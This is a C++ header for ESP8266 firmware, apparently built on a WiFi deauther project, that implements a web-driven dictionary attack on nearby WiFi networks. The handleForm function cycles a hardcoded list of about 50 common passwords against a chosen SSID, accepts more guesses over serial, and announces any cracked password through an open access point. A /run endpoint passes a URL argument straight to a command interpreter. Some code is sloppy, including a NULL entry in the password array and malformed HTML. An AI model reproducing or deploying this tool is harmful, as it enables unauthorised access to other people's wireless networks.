#ifndef WifiManager_h
#define WifiManager_h

#include "Arduino.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
extern "C" {
#include "user_interface.h"
}

#define WIFI_MODE_OFF 0
#define WIFI_MODE_AP 1
#define WIFI_MODE_STATION 2
#define MAX_MESSAGE 30

/*
   This file contains all necessary functions for hosting and connecting to an access point.
   For compatibility and simplicity, all those functions are global.
 */

// Important strings
const char W_DEAUTHER[] PROGMEM = "deauth.me"; // captive portal domain (alternative to 192.168.4.1)
const char W_WEBINTERFACE[] PROGMEM = "/web";  // default folder containing the web files
const char W_ERROR_PASSWORD[] PROGMEM = "ERROR: Password must have at least 8 characters!";
const char W_DEFAULT_LANG[] PROGMEM = "/lang/default.lang";

const char W_HTML[] PROGMEM = "text/html";
const char W_CSS[] PROGMEM = "text/css";
const char W_JS[] PROGMEM = "application/javascript";
const char W_PNG[] PROGMEM = "image/png";
const char W_GIF[] PROGMEM = "image/gif";
const char W_JPG[] PROGMEM = "image/jpeg";
const char W_ICON[] PROGMEM = "image/x-icon";
const char W_XML[] PROGMEM = "text/xml";
const char W_XPDF[] PROGMEM = "application/x-pdf";
const char W_XZIP[] PROGMEM = "application/x-zip";
const char W_GZIP[] PROGMEM = "application/x-gzip";
const char W_JSON[] PROGMEM = "application/json";
const char W_TXT[] PROGMEM = "text/plain";

const char W_DOT_HTM[] PROGMEM = ".htm";
const char W_DOT_HTML[] PROGMEM = ".html";
const char W_DOT_CSS[] PROGMEM = ".css";
const char W_DOT_JS[] PROGMEM = ".js";
const char W_DOT_PNG[] PROGMEM = ".png";
const char W_DOT_GIF[] PROGMEM = ".gif";
const char W_DOT_JPG[] PROGMEM = ".jpg";
const char W_DOT_ICON[] PROGMEM = ".ico";
const char W_DOT_XML[] PROGMEM = ".xml";
const char W_DOT_PDF[] PROGMEM = ".pdf";
const char W_DOT_ZIP[] PROGMEM = ".zip";
const char W_DOT_GZIP[] PROGMEM = ".gz";
const char W_DOT_JSON[] PROGMEM = ".json";

static char buff[MAX_MESSAGE];
const char* ssidME = "none"; //Enter SSID
const char* passwordME = "password"; //Enter Password
char incoming = 0;

bool ssidSelected = false;
bool failed = false;

int itNum = 0;
int ind = 0;
int seconds = 0;
int wifiNetwork = 0;

String toPrint = "";

#define passwordsSize 50


const char dictionaryHtmlOne[] =  {"<!DOCTYPE html><html><head><title>nayanCard</title><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"/stylesheet\" href=\"main.css\"/></head><body><div class=\"page-wrap\"><nav id=\"nav\"><ul><li><a href=\"indexMyHome.html\" class=\"active\"><span class=\"icon fa-home\"></span></a></li><li><a href=\"generic.html\"><span class=\"icon fa-wifi\"></span></a></li></ul></nav><section id=\"main\"><header id=\"header\"><div>Dictionary Attack</div></header><section><div class=\"inner\"><header><h1>Dictionary Attack</h1></header><p>This tool starts automaticly, first trying 100 of the most commen passwords avalible, then, if necessary, opens a serial connection over com at a rate of 115200 in which you can set up a simple python program to send strings(one every 20 seconds) in order to send a longer list</p><div> </div><p id=\"progressDict\">"};
const char dictionaryHtmlTwo[] =  {"</p><br> <form action=\"/get\"> Enter SSID Number Here: <input type=\"text\" name=\"ssidInput\" value=\"\"><input type=\"submit\" value=\"Submit\"> </form><br></div></section><footer id=\"footer\"<div> class=\"copyright\"&copy; Nayan Smuek</a></div></footer></section></div></body></html>"};

String passwordSuccess = "no passwords yet";
//String ssidInputed = "";

// Server and other global objects
ESP8266WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
File fsUploadFile;

// current WiFi mode and config
uint8_t wifiMode = WIFI_MODE_OFF;

bool   wifi_config_hidden        = false;
bool   wifi_config_captivePortal = false;
String wifi_config_ssid;
String wifi_config_password;
String wifi_config_path;

void handlePassword() {
server.send(200, "text/plain", passwordSuccess);
}

void handleSelect()
{
  server.send(200, "text/html", "<!DOCTYPE HTML><html><head><meta http-equiv = \"refresh\" content = \"12; url = http://192.168.4.1/selection\" /></head><body>loading, should take about 10-15 seconds</body></html>");
  // Serial.println(dictionaryHtmlOne+dictionaryHtmlTwo);
  Serial.begin(115200);

  Serial.print("Scan start ... ");
  int n = WiFi.scanNetworks();
  Serial.print(n);
  Serial.println(" network(s) found");
  for (int i = 0; i < n; i++)
  {
    toPrint += i;
    Serial.print(i);
    toPrint += " ";
    Serial.print(" ");
    toPrint += (WiFi.SSID(i));
    Serial.print(WiFi.SSID(i));
     toPrint += "<br>";
    Serial.print('\n');
 }
     toPrint += "<br>";
 //toPrint += "enter the number of the network to attack";
  Serial.println();

  Serial.print("targeting ");//targeting "ssid"
  Serial.print(ssidME);
  Serial.print('\n');
  
  //String before = ssidME;
  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);


  Serial.println("select number of network to targert");
}

void handleSelection()
{
  Serial.println("handle selection");
  toPrint += "<br> To see progress open a  serial port on at a rate of 115200 to this device, the attack locks up the wifi antenna so the webpage is no longer usable";
  toPrint += "to stop this process, press the reset button on the device or unplug it from power and plug it back in";
  toPrint += "once connected , the device will create a network with the name nayanCard has found the password, connect there and go to 192.168.4.1/password to see the saved password,";
  toPrint += "the odds of success are only about 40 or so percent with this attack so if it is taking too long(around 50 minutes with the onboard list) the device will stop the attack and declare it a failure unless a serial connection is started and more passwords are entered";
   server.send(200, "text/html", dictionaryHtmlOne+toPrint+dictionaryHtmlTwo);
}

void handleForm() {
  char *passwords[] = {
   "123456789",
   "12345678",
   "abcd1234",
   "1234abcd",
   "Password",
   "password",
   "abcdefgh",
   "password.",
   "123456789.",
   "12345678.",
   "11111111",
   "111111111",
   "1111111111",
   "1234567890",
   "Passwords",
   "Passwords.",
   "iloveyou",
   "12341234",
   "123123123",
   "1234512345",
   "00000000",
   "0000000000",
   "logmein",
   "letmein",
   "password1",
   "77777777",
   "88888888",
   "66666666",
   "55555555",
   "99999999",
   "loversloveme",
   "hatersloveme",
   "hatershateme",
   "PASSWORD",
   "###123###",
   "Apple Network 0273df",
   "MiniAP",
   "belkin54g",
   "NETGEAR",
   "linksys",
   "public",
   "admin",
   "user",
   "default",
   "1234567890",
   "passw0rd",
   "football",
   "123456789",
   NULL,
   "michelangelo"
};
  String toOutput = "";
  String ssidInputed = server.arg("ssidInput");
  Serial.println("SSID INPUTED IS NOW:");
  Serial.println(ssidInputed);

  String toChange = WiFi.SSID((ssidInputed.toInt()));
  char changed[toChange.length()+1];

  toChange.toCharArray(changed, toChange.length()+1);


  ssidME = changed;
  toOutput += "device now attacking ";
  toOutput += ssidME;
  //server.send(200, "text/html", dictionaryHtmlOne+toOutput+dictionaryHtmlTwo);

  while ((WiFi.status() != WL_CONNECTED) && !failed) 
  {
    
  static char buffer[MAX_MESSAGE];
  static unsigned char index = 0;
  char currentChar;

      while(itNum<passwordsSize){
      passwordME = passwords[itNum];
      String outputProgress = "";


      outputProgress += "You are currently testing the network ";
      outputProgress += ssidME;
      outputProgress += " with the password ";
      outputProgress += passwordME;
      outputProgress += " which is number ";
      outputProgress += itNum+1;
      outputProgress += " out of ";
      outputProgress += passwordsSize;
      outputProgress += ".";
      outputProgress += " About ";
      outputProgress += seconds;
      outputProgress += " seconds have elapsed since the start of this attack";
      Serial.println(outputProgress);
      itNum++;
      
      WiFi.begin(ssidME, passwordME);
      delay(21850);
      seconds += 22;
      }

while(seconds < 3000){
    while(Serial.available() > 0) {//try serical.avalible as a bool
      currentChar = Serial.read();
      if (currentChar == '\n'){

      Serial.print("You entered: "); //you entered "what you entered"
      Serial.print(buffer);
      Serial.print('\n');
      passwordME = buffer;

      Serial.print("trying password number "); //trying password number "number": "password"           seconds elapsed: "seconds"
      Serial.print((itNum+1));
      Serial.print(": ");
      Serial.print(passwordME);
      Serial.print('\n');
      Serial.print("seconds elapsed:");
      Serial.print(seconds);
      Serial.print('\n');
      Serial.print('\n');
      itNum++;
      
      WiFi.begin(ssidME, passwordME);
      delay(21850);
      seconds += 22;

      Serial.println("please enter a password to try");
      Serial.print('\n');

      buffer[0] = 0;
      index = 0;
     } else {       
      if (index < MAX_MESSAGE-1) {
        buffer[index++] = currentChar;
        buffer[index] = 0;
       }  
      } 
     }
     }
     Serial.println("this failed");
     failed = true;
    }

    if(!failed)
    {
    Serial.print("WiFi connection Successful, taking about ");//Wifi connection succesful, taking about "seconds"     The Ip address of this module is "ip"    The wifi password for "network" is "password"
    Serial.print(seconds);
    Serial.print(" seconds");
    Serial.print('\n');
    Serial.print("Information:");
    Serial.print('\n');
    WiFi.printDiag(Serial);

    String correctPassword = passwordME;
    WiFi.softAP("nayanCard has found the password", NULL);             // Start the access point

    passwordSuccess = "";
    passwordSuccess += "The password for the wifi network ";
    passwordSuccess += ssidME;
    passwordSuccess += " Is";
    passwordSuccess += passwordME;
    }


     if(failed){
      WiFi.softAP("nayanCard failed to find the password", NULL);             // Start the access point
     }

  //}
  //String before = ssidME;
  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);
}


void stopAP() {
    if (wifiMode == WIFI_MODE_AP) {
        wifi_promiscuous_enable(0);
        WiFi.persistent(false);
        WiFi.disconnect(true);
        wifi_set_opmode(STATION_MODE);
        prntln(W_STOPPED_AP);
        wifiMode = WIFI_MODE_STATION;
    }
}

void wifiUpdate() {
    if ((wifiMode != WIFI_MODE_OFF) && !scan.isScanning()) {
        server.handleClient();
        dnsServer.processNextRequest();
    }
}

String getWifiMode() {
    switch (wifiMode) {
        case WIFI_MODE_OFF:
            return W_MODE_OFF;

            break;

        case WIFI_MODE_AP:
            return W_MODE_AP;

            break;

        case WIFI_MODE_STATION:
            return W_MODE_ST;

            break;

        default:
            return String();
    }
}

String getContentType(String filename) {
    if (server.hasArg("download")) return String(F("application/octet-stream"));
    else if (filename.endsWith(str(W_DOT_GZIP))) filename = filename.substring(0, filename.length() - 3);
    else if (filename.endsWith(str(W_DOT_HTM))) return str(W_HTML);
    else if (filename.endsWith(str(W_DOT_HTML))) return str(W_HTML);
    else if (filename.endsWith(str(W_DOT_CSS))) return str(W_CSS);
    else if (filename.endsWith(str(W_DOT_JS))) return str(W_JS);
    else if (filename.endsWith(str(W_DOT_PNG))) return str(W_PNG);
    else if (filename.endsWith(str(W_DOT_GIF))) return str(W_GIF);
    else if (filename.endsWith(str(W_DOT_JPG))) return str(W_JPG);
    else if (filename.endsWith(str(W_DOT_ICON))) return str(W_ICON);
    else if (filename.endsWith(str(W_DOT_XML))) return str(W_XML);
    else if (filename.endsWith(str(W_DOT_PDF))) return str(W_XPDF);
    else if (filename.endsWith(str(W_DOT_ZIP))) return str(W_XZIP);
    else if (filename.endsWith(str(W_DOT_JSON))) return str(W_JSON);
    else return str(W_TXT);
}

bool handleFileRead(String path) {
    // prnt(W_AP_REQUEST);
    // prnt(path);

    if (!path.charAt(0) == SLASH) path = String(SLASH) + path;

    if (path.charAt(path.length() - 1) == SLASH) path += String(F("index.html"));

    String contentType = getContentType(path);

    if (!SPIFFS.exists(path)) {
        if (SPIFFS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
        else if (SPIFFS.exists(wifi_config_path + path)) path = wifi_config_path + path;
        else if (SPIFFS.exists(wifi_config_path + path + str(W_DOT_GZIP))) path = wifi_config_path + path + str(
                W_DOT_GZIP);
        else {
            // prntln(W_NOT_FOUND);
            return false;
        }
    }

    File file = SPIFFS.open(path, "r");
    server.streamFile(file, contentType);
    file.close();
    // prnt(SPACE);
    // prntln(W_OK);

    return true;
}

void handleFileList() {
    if (!server.hasArg("dir")) {
        server.send(500, str(W_TXT), str(W_BAD_ARGS));
        return;
    }

    String path = server.arg("dir");
    // Serial.println("handleFileList: " + path);
    Dir dir = SPIFFS.openDir(path);

    String output = String(OPEN_BRACKET); // {
    File   entry;
    bool   first = true;

    while (dir.next()) {
        entry = dir.openFile("r");

        if (first) first = false;
        else output += COMMA;                                                 // ,

        output += OPEN_BRACKET;                                               // [
        output += String(DOUBLEQUOTES) + entry.name() + String(DOUBLEQUOTES); // "filename"
        output += CLOSE_BRACKET;                                              // ]

        entry.close();
    }

    output += CLOSE_BRACKET;
    server.send(200, str(W_JSON).c_str(), output);
}

void sendProgmem(const char* ptr, size_t size, const char* type) {
    server.sendHeader("Content-Encoding", "gzip");
    server.sendHeader("Cache-Control", "max-age=86400");
    server.send_P(200, str(type).c_str(), ptr, size);
}

// path = folder of web files, ssid = name of network, password = password ("0" => no password), hidden = if the network
// is visible, captivePortal = enable a captive portal
void startAP(String path, String ssid, String password, uint8_t ch, bool hidden, bool captivePortal) {
    if (password.length() < 8) {
        prntln(W_ERROR_PASSWORD);
        return;
    }

    if (!path.charAt(0) == SLASH) path = String(SLASH) + path;

    if (password == String(ZERO)) password = String(NEWLINE);

    wifi_config_path     = path;
    wifi_config_ssid     = ssid;
    wifi_config_password = password;
    setWifiChannel(ch);
    wifi_config_hidden        = hidden;
    wifi_config_captivePortal = captivePortal;

    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(ssid.c_str(), password.c_str(), wifi_channel, hidden);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, String(ASTERIX), apIP);

    MDNS.begin(str(W_DEAUTHER).c_str());

    server.on(String(F("/list")).c_str(), HTTP_GET, handleFileList); // list directory


    // ================================================================
    // post here the output of the webConverter.py
#ifdef USE_PROGMEM_WEB_FILES
    if (!settings.getWebSettings().use_spiffs) {
        server.on(String(SLASH).c_str(), HTTP_GET, [] () {
            sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
        });
        server.on(String(F("/attack.html")).c_str(), HTTP_GET, [] () {
            sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
        });
        server.on(String(F("/index.html")).c_str(), HTTP_GET, [] () {
            sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
        });
        server.on(String(F("/info.html")).c_str(), HTTP_GET, [] () {
            sendProgmem(infohtml, sizeof(infohtml), W_HTML);
        });
        server.on(String(F("/scan.html")).c_str(), HTTP_GET, [] () {
            sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
        });
        server.on(String(F("/settings.html")).c_str(), HTTP_GET, [] () {
            sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
        });
        server.on(String(F("/ssids.html")).c_str(), HTTP_GET, [] () {
            sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
        });
        server.on(String(F("/style.css")).c_str(), HTTP_GET, [] () {
            sendProgmem(stylecss, sizeof(stylecss), W_CSS);
        });
        server.on(String(F("/js/attack.js")).c_str(), HTTP_GET, [] () {
            sendProgmem(attackjs, sizeof(attackjs), W_JS);
        });
        server.on(String(F("/js/scan.js")).c_str(), HTTP_GET, [] () {
            sendProgmem(scanjs, sizeof(scanjs), W_JS);
        });
        server.on(String(F("/js/settings.js")).c_str(), HTTP_GET, [] () {
            sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
        });
        server.on(String(F("/js/site.js")).c_str(), HTTP_GET, [] () {
            sendProgmem(sitejs, sizeof(sitejs), W_JS);
        });
        server.on(String(F("/js/ssids.js")).c_str(), HTTP_GET, [] () {
            sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
        });
        server.on(String(F("/lang/cn.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(cnlang, sizeof(cnlang), W_JSON);
        });
        server.on(String(F("/lang/cs.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(cslang, sizeof(cslang), W_JSON);
        });
        server.on(String(F("/lang/de.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(delang, sizeof(delang), W_JSON);
        });
        server.on(String(F("/lang/en.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(enlang, sizeof(enlang), W_JSON);
        });
        server.on(String(F("/lang/es.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(eslang, sizeof(eslang), W_JSON);
        });
        server.on(String(F("/lang/fi.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(filang, sizeof(filang), W_JSON);
        });
        server.on(String(F("/lang/fr.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(frlang, sizeof(frlang), W_JSON);
        });
        server.on(String(F("/lang/it.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(itlang, sizeof(itlang), W_JSON);
        });
        server.on(String(F("/lang/ru.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(rulang, sizeof(rulang), W_JSON);
        });
        server.on(String(F("/lang/tlh.lang")).c_str(), HTTP_GET, [] () {
            sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
        });
        server.on("/get", handleForm);
        server.on("/password", handlePassword);
        server.on("/selection", handleSelection);
        //server.on(String(F("/start")).c_str(), HTTP_GET, [] () {
        server.on("/start", handleSelect);

    }
    server.on(str(W_DEFAULT_LANG).c_str(), HTTP_GET, [] () {
        if (!settings.getWebSettings().use_spiffs) {
            if (String(settings.getWebSettings().lang) == String(F("cn"))) sendProgmem(cnlang, sizeof(cnlang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("cs"))) sendProgmem(cslang, sizeof(cslang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("de"))) sendProgmem(delang, sizeof(delang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("en"))) sendProgmem(enlang, sizeof(enlang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("es"))) sendProgmem(eslang, sizeof(eslang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("fi"))) sendProgmem(filang, sizeof(filang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("fr"))) sendProgmem(frlang, sizeof(frlang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("it"))) sendProgmem(itlang, sizeof(itlang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("ru"))) sendProgmem(rulang, sizeof(rulang), W_JSON);
            else if (String(settings.getWebSettings().lang) == String(F("tlh"))) sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);

            else handleFileRead(String(F("/web/lang/")) + String(settings.getWebSettings().lang) + String(F(".lang")));
        } else {
            handleFileRead(String(F("/web/lang/")) + String(settings.getWebSettings().lang) + String(F(".lang")));
        }
    });
#endif /* ifdef USE_PROGMEM_WEB_FILES */
       // ================================================================

    server.on(String(F("/run")).c_str(), HTTP_GET, [] () {
        server.send(200, str(W_TXT), str(W_OK).c_str());
        String input = server.arg("cmd");
        cli.exec(input);
    });

    server.on(String(F("/attack.json")).c_str(), HTTP_GET, [] () {
        server.send(200, str(W_JSON), attack.getStatusJSON());
    });

    // aggressively caching static assets
    server.serveStatic("/js", SPIFFS, String(wifi_config_path + "/js").c_str(), "max-age=86400");

    // called when the url is not defined here
    // use it to load content from SPIFFS
    server.onNotFound([] () {
        if (!handleFileRead(server.uri())) {
            //server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
            //server.send(200, "text/html", indexhtml); 
            sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);

        }
    });

    server.begin();
    wifiMode = WIFI_MODE_AP;

    prntln(W_STARTED_AP);
    printWifiStatus();
}

void printWifiStatus() {
    prnt(String(F("[WiFi] Path: '")));
    prnt(wifi_config_path);
    prnt(String(F("', Mode: '")));

    switch (wifiMode) {
        case WIFI_MODE_OFF:
            prnt(W_MODE_OFF);
            break;

        case WIFI_MODE_AP:
            prnt(W_AP);
            break;

        case WIFI_MODE_STATION:
            prnt(W_STATION);
            break;
    }
    prnt(String(F("', SSID: '")));
    prnt(wifi_config_ssid);
    prnt(String(F("', password: '")));
    prnt(wifi_config_password);
    prnt(String(F("', channel: '")));
    prnt(wifi_channel);
    prnt(String(F("', hidden: ")));
    prnt(b2s(wifi_config_hidden));
    prnt(String(F(", captive-portal: ")));
    prntln(b2s(wifi_config_captivePortal));
}

void startAP() {
    startAP(wifi_config_path.c_str(), wifi_config_ssid.c_str(),
            wifi_config_password.c_str(), wifi_channel, wifi_config_hidden, wifi_config_captivePortal);
}

void startAP(String path) {
    wifi_config_path = path;
    startAP();
}

void loadWifiConfigDefaults() {
    wifi_config_hidden        = settings.getAccessPointSettings().hidden;
    wifi_config_ssid          = settings.getAccessPointSettings().ssid;
    wifi_config_password      = settings.getAccessPointSettings().password;
    wifi_config_captivePortal = settings.getWebSettings().captive_portal;
    wifi_config_path          = str(W_WEBINTERFACE);
}

void resumeAP() {
    if (wifiMode != WIFI_MODE_AP) {
        wifiMode = WIFI_MODE_AP;
        wifi_promiscuous_enable(0);
        WiFi.softAPConfig(apIP, apIP, netMsk);
        WiFi.softAP(wifi_config_ssid.c_str(), wifi_config_password.c_str(), wifi_channel, wifi_config_hidden);
        prntln(W_STARTED_AP);
    }
}

#endif // ifndef WifiManager_h
